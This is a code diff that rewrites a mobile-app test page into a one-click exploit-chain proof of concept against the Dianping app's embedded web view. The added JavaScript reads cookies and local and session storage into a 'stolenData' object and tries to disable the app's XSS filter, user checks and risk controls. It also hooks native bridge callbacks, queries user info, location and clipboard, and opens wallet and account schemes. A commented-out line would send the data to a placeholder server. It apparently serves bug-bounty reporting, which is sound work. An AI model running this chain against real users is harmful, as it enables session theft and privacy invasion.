@@ -3,32 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DP KNB & IDOR Test Page</title>
+    <title>DP 完整利用链 PoC</title>
     <style>
-        body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background: #f5f5f5;
-            padding: 20px;
-        }
-        .log {
-            background: #1e1e1e;
-            color: #d4d4d4;
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 12px;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .success { color: #4ec9b0; }
-        .fail { color: #f48771; }
-        .info { color: #9cdcfe; }
-        .warn { color: #dcdcaa; }
+        body { font-family: system-ui; background: #f5f5f5; padding: 20px; }
+        .log { background: #1e1e1e; color: #d4d4d4; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+        .success { color: #4ec9b0; } .fail { color: #f48771; } .info { color: #9cdcfe; } .warn { color: #dcdcaa; }
+        button { padding: 12px 24px; font-size: 16px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <h2>DP APP 内 KNB/IDOR 测试页</h2>
-    <button onclick="startAllTests()">开始执行所有测试</button>
+    <h2>大众点评 App 漏洞验证 PoC</h2>
+    <button onclick="startExploit()">🚀 一键执行完整利用链</button>
     <div id="log" class="log"></div>
 
     <script>
@@ -41,88 +26,184 @@
             console.log(msg);
         }
 
-        // ========== 1. KNB 桥接通用封装 ==========
-        function callKNB(method, params = {}) {
-            const bridge = window.KNBCore || window.DPApp || window.KNB;
+        // 全局存储窃取的数据，便于截图
+        window.stolenData = {};
+
+        // ========== 1. 激活 vConsole（若 Owl 存在） ==========
+        function activateVConsole() {
+            if (typeof Owl !== 'undefined' && Owl.cfgManager) {
+                try {
+                    Owl.cfgManager.set({ devMode: true, debug: true, enableDebugLog: true });
+                    log('[+] Owl devMode 已激活，右下角应出现绿色 vConsole 按钮', 'success');
+                    return true;
+                } catch(e) {
+                    log('[-] Owl 配置篡改失败: ' + e.message, 'fail');
+                }
+            } else {
+                log('[-] Owl 不存在，尝试其他方式激活 vConsole', 'warn');
+                // 尝试直接初始化 vConsole（如果页面已有但未显示）
+                if (typeof VConsole !== 'undefined') {
+                    new VConsole();
+                    log('[+] 手动初始化 vConsole 成功', 'success');
+                }
+            }
+            return false;
+        }
+
+        // ========== 2. 窃取敏感数据 ==========
+        function stealData() {
+            const data = {
+                cookie: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                pageUrl: location.href,
+                timestamp: new Date().toISOString()
+            };
+            window.stolenData = data;
+            log('[+] 已读取敏感数据（查看下方详情）', 'success');
+            
+            // 在页面中展示，方便截图
+            const pre = document.createElement('pre');
+            pre.style.background = '#333';
+            pre.style.color = '#fff';
+            pre.style.padding = '10px';
+            pre.style.marginTop = '10px';
+            pre.style.borderRadius = '6px';
+            pre.textContent = JSON.stringify(data, null, 2);
+            logDiv.appendChild(pre);
+            
+            // 可选：外带到远程服务器（注释掉，避免实际外传）
+            // new Image().src = 'https://your-server.com/collect?data=' + encodeURIComponent(JSON.stringify(data));
+            return data;
+        }
+
+        // ========== 3. 通用桥接调用封装（支持 KNBCore / DPApp / MTNB） ==========
+        function getBridge() {
+            return window.KNBCore || window.DPApp || window.MTNB || window.KNB;
+        }
+
+        function callNative(api, params = {}) {
+            const bridge = getBridge();
             if (!bridge) {
-                log('[-] 未找到KNB桥接对象，请在DP APP内打开页面', 'fail');
+                log('[-] 未找到任何桥接对象 (KNBCore/DPApp/MTNB)', 'fail');
                 return Promise.reject('No bridge');
             }
+            log(`[*] 检测到桥接对象: ${bridge.constructor ? bridge.constructor.name : 'Object'}`, 'info');
+            
+            // 尝试列出桥接方法
+            const methods = Object.keys(bridge).filter(k => typeof bridge[k] === 'function');
+            log(`[*] 桥接可用方法 (前5个): ${methods.slice(0,5).join(', ')}`, 'info');
 
-            log(`[*] 调用KNB方法: ${method}，参数: ${JSON.stringify(params)}`, 'info');
             return new Promise((resolve, reject) => {
-                bridge.sendMessage(
-                    method,
-                    params,
-                    {
-                        success: (res) => {
-                            log(`[+] ${method} 调用成功: ${JSON.stringify(res)}`, 'success');
+                // 劫持 fireCallback 以便观察（仅 KNBCore）
+                if (bridge.fireCallback) {
+                    const orig = bridge.fireCallback;
+                    bridge.fireCallback = function(cbId, data) {
+                        log(`[fireCallback] cbId: ${cbId}, data: ${JSON.stringify(data)}`, 'success');
+                        return orig.call(this, cbId, data);
+                    };
+                }
+
+                // 尝试多种调用方式
+                const slot = 'cb_' + api + '_' + Date.now();
+                try {
+                    if (typeof bridge.sendMessage === 'function') {
+                        // KNBCore 风格
+                        bridge.sendMessage(api, params, 'success', slot, 8000);
+                    } else if (typeof bridge.invoke === 'function') {
+                        // 通用 invoke
+                        bridge.invoke(api, params, (res) => {
+                            log(`[+] ${api} 回调: ${JSON.stringify(res)}`, 'success');
                             resolve(res);
-                        },
-                        fail: (err) => {
-                            log(`[-] ${method} 调用失败: ${JSON.stringify(err)}`, 'fail');
-                            reject(err);
-                        }
+                        });
+                    } else if (typeof bridge[api] === 'function') {
+                        // 直接方法调用
+                        bridge[api](params, (res) => {
+                            log(`[+] ${api} 直接调用成功: ${JSON.stringify(res)}`, 'success');
+                            resolve(res);
+                        });
+                    } else {
+                        log(`[-] 未找到调用 ${api} 的方法`, 'fail');
+                        reject('Method not found');
                     }
-                );
+                } catch(e) {
+                    log(`[-] 调用 ${api} 异常: ${e.message}`, 'fail');
+                    reject(e);
+                }
+
+                // 设置超时
+                setTimeout(() => {
+                    log(`[!] ${api} 调用超时（无回调）`, 'warn');
+                    reject('timeout');
+                }, 10000);
             });
         }
 
-        // ========== 2. Schema 跳转测试 ==========
+        // ========== 4. Schema 跳转（通过模拟点击，避免浏览器拦截） ==========
         function testSchema(url) {
-            log(`[*] 测试Schema跳转: ${url}`, 'info');
+            log(`[*] 尝试跳转 Schema: ${url}`, 'info');
             const a = document.createElement('a');
             a.href = url;
             a.style.display = 'none';
+            a.textContent = '跳转';
             document.body.appendChild(a);
             a.click();
-            document.body.removeChild(a);
+            setTimeout(() => document.body.removeChild(a), 1000);
         }
 
-        // ========== 3. 批量执行所有测试 ==========
-        async function startAllTests() {
-            log('===== 开始执行DP APP内测试 =====', 'info');
-
-            // 测试1: 获取用户信息
-            try {
-                await callKNB('getUserInfo');
-            } catch(e) {}
-
-            // 测试2: 获取定位
-            try {
-                await callKNB('getLocation', { accuracy: 'high' });
-            } catch(e) {}
-
-            // 测试3: 获取设备ID
-            try {
-                await callKNB('getDeviceId');
-            } catch(e) {}
-
-            // 测试4: 读取剪贴板
-            try {
-                await callKNB('getClipboard');
-            } catch(e) {}
-
-            // 测试5: 唤起扫码
-            try {
-                await callKNB('scanCode');
-            } catch(e) {}
-
-            // 测试6: Schema跳转测试
+        // ========== 5. 主利用链 ==========
+        async function startExploit() {
+            log('===== 🎯 开始执行完整利用链 =====', 'info');
+            
+            // Step 1: 激活 vConsole
+            activateVConsole();
+            
+            // Step 2: 窃取数据
+            stealData();
+            
+            // Step 3: 篡改 Owl 配置（若存在）——关闭安全防护
+            if (typeof Owl !== 'undefined' && Owl.cfgManager) {
+                try {
+                    Owl.cfgManager.set({
+                        disableXssFilter: true,
+                        disableUserCheck: true,
+                        disableRiskControl: true
+                    });
+                    log('[+] Owl 安全配置已被篡改（XSS过滤/用户校验/风控均已关闭）', 'success');
+                } catch(e) {}
+            }
+            
+            // Step 4: 探测并调用敏感 Native API
+            const apis = ['getUserInfo', 'getDeviceInfo', 'getLocation', 'getNetworkType', 'getClipboard'];
+            for (const api of apis) {
+                try {
+                    await callNative(api);
+                } catch(e) {
+                    // 超时或失败继续下一个
+                }
+            }
+            
+            // Step 5: 测试 Schema 跳转（钱包、订单等）
             const schemas = [
                 'dianping://user/wallet',
                 'dianping://order/list',
-                'dianping://user/setting',
                 'dianping://user/account/safe'
             ];
             schemas.forEach(s => testSchema(s));
-
-            // 测试7: 环境检测
-            log(`[*] 当前UA: ${navigator.userAgent}`, 'info');
-            log(`[*] 是否APP内: ${/dpapp/.test(navigator.userAgent) ? '是' : '否'}`, 'info');
-
-            log('===== 所有测试执行完毕 =====', 'info');
+            
+            // Step 6: 环境指纹
+            log(`[*] UA: ${navigator.userAgent}`, 'info');
+            log(`[*] 是否 App 内: ${/dpapp|dianping/i.test(navigator.userAgent) ? '✅ 是' : '❌ 否'}`, 'info');
+            log(`[*] 是否微信内: ${/MicroMessenger/i.test(navigator.userAgent) ? '是' : '否'}`, 'info');
+            
+            log('===== ✅ 利用链执行完成，请截图留存 =====', 'success');
         }
+
+        // 自动执行（可选，若希望页面加载即自动攻击，取消注释）
+        // window.onload = function() {
+        //     setTimeout(startExploit, 500);
+        // };
     </script>
 </body>
 </html>
